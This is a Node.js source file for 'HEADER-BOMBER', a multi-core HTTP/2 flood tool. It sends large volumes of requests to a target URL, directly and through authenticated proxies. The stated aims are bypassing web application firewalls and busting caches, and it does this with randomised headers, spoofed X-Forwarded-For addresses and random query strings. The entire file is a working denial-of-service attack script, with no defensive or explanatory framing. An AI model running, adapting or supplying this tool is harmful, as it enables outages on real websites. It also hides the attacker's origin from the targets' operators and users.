// R10-5: HEADER-BOMBER - Randomized Headers Flood
// Focus: WAF bypass + Cache busting
// Technique: Unique headers per request
// Updated: Mixed main IP + proxies + authenticated proxy support

const http2 = require('http2');
const tls = require('tls');
const net = require('net');
const fs = require('fs');
const crypto = require('crypto');
const cluster = require('cluster');
const os = require('os');

const CPU_CORES = os.cpus().length;
let proxies = [];
let userAgents = [];

// Parse proxy line - supports both formats: host:port and host:port:username:password
function parseProxy(proxyLine) {
    const parts = proxyLine.split(':');
    if (parts.length === 4) {
        return {
            host: parts[0],
            port: parseInt(parts[1]),
            username: parts[2],
            password: parts[3],
            auth: true
        };
    } else if (parts.length >= 2) {
        return {
            host: parts[0],
            port: parseInt(parts[1]),
            auth: false
        };
    }
    return null;
}

// Load proxies and user agents
try {
    const proxyLines = fs.readFileSync('proxy.txt', 'utf-8').split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#'));
    
    proxies = proxyLines.map(parseProxy).filter(p => p !== null);
    console.log(`[R10-5] Loaded ${proxies.length} proxies (${proxies.filter(p => p.auth).length} authenticated)`);
} catch (e) {
    console.log('[R10-5] No proxy.txt found, running with main IP only');
}

// Mix settings
const USE_MAIN_IP = true;
const MIX_RATIO = 0.3; // 30% main IP

try {
    userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#'));
    console.log(`[R10-5] Loaded ${userAgents.length} user agents`);
} catch (e) {
    console.log('[R10-5] No ua.txt found, using default UAs');
    userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
    ];
}

const referers = [
    'https://google.com', 'https://facebook.com', 'https://twitter.com',
    'https://instagram.com', 'https://linkedin.com', 'https://youtube.com',
    'https://amazon.com', 'https://netflix.com', 'https://reddit.com'
];

function shouldUseMainIp() {
    return USE_MAIN_IP && Math.random() < MIX_RATIO;
}

if (cluster.isMaster) {
    console.log(`[R10-5] HEADER-BOMBER launching on ${CPU_CORES} cores`);
    console.log(`[R10-5] Mode: ${USE_MAIN_IP ? 'MIXED' : 'PROXY-ONLY'} (${MIX_RATIO*100}% main IP)`);
    for (let i = 0; i < CPU_CORES; i++) cluster.fork();
    
    setTimeout(() => process.exit(0), process.argv[3] * 1000 || 300);
} else {
    const target = process.argv[2];
    const time = process.argv[3] || 300;
    const parsed = new URL(target);
    
    const sessions = [];
    let requestCount = 0;
    let mainIpCount = 0;
    let proxyCount = 0;
    
    // Create sessions with mixed IPs and auth support
    (async () => {
        for (let i = 0; i < 50; i++) {
            try {
                const useMain = shouldUseMainIp();
                let tlsConn;
                
                if (!useMain && proxies.length > 0) {
                    const proxy = proxies[i % proxies.length];
                    
                    const socket = net.connect(proxy.port, proxy.host, () => {
                        let connectReq = `CONNECT ${parsed.hostname}:443 HTTP/1.1\r\nHost: ${parsed.hostname}:443\r\n`;
                        
                        if (proxy.auth) {
                            const auth = Buffer.from(`${proxy.username}:${proxy.password}`).toString('base64');
                            connectReq += `Proxy-Authorization: Basic ${auth}\r\n`;
                        }
                        
                        connectReq += '\r\n';
                        socket.write(connectReq);
                        
                        socket.once('data', () => {
                            const tlsSocket = tls.connect({
                                socket: socket,
                                servername: parsed.hostname,
                                rejectUnauthorized: false,
                                ALPNProtocols: ['h2']
                            }, () => {
                                const session = http2.connect(parsed.origin, {
                                    createConnection: () => tlsSocket
                                });
                                session.on('error', () => {});
                                sessions.push(session);
                                proxyCount++;
                            });
                        });
                    });
                } else {
                    const session = http2.connect(parsed.origin, {
                        rejectUnauthorized: false
                    });
                    session.on('error', () => {});
                    sessions.push(session);
                    mainIpCount++;
                }
            } catch (e) {}
            
            await new Promise(r => setTimeout(r, 100));
        }
        console.log(`[R10-5] Connections: Main IP: ${mainIpCount}, Proxy: ${proxyCount}`);
    })();
    
    function generateRandomHeaders() {
        const ua = userAgents[Math.floor(Math.random() * userAgents.length)];
        
        const headers = {
            ':method': Math.random() > 0.7 ? 'POST' : 'GET',
            ':path': parsed.pathname + '?' + crypto.randomBytes(8).toString('hex'),
            'user-agent': ua,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': ['en-US', 'en-GB', 'fr-FR', 'de-DE', 'ja-JP'][Math.floor(Math.random() * 5)],
            'accept-encoding': 'gzip, deflate, br',
            'referer': referers[Math.floor(Math.random() * referers.length)],
            'cache-control': ['no-cache', 'max-age=0', 'no-store'][Math.floor(Math.random() * 3)],
            'x-forwarded-for': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
            'x-request-id': crypto.randomBytes(16).toString('hex')
        };
        
        return headers;
    }
    
    setTimeout(() => {
        const interval = setInterval(() => {
            for (let s = 0; s < sessions.length; s++) {
                const session = sessions[s];
                if (!session || session.destroyed) continue;
                
                for (let i = 0; i < 20; i++) {
                    try {
                        const headers = generateRandomHeaders();
                        const req = session.request(headers);
                        
                        req.on('response', () => req.close());
                        req.on('error', () => {});
                        
                        if (headers[':method'] === 'POST') {
                            req.write(crypto.randomBytes(64).toString('hex'));
                        }
                        
                        req.end();
                        requestCount++;
                    } catch (e) {}
                }
            }
        }, 50);
        
        setInterval(() => {
            console.log(`[R10-5] RPS: ${requestCount} | Main IP: ${mainIpCount} | Proxy: ${proxyCount}`);
            requestCount = 0;
        }, 1000);
        
        setTimeout(() => {
            clearInterval(interval);
            sessions.forEach(s => {
                try { s.destroy(); } catch (e) {}
            });
            process.exit(0);
        }, time * 1000);
    }, 5000);
}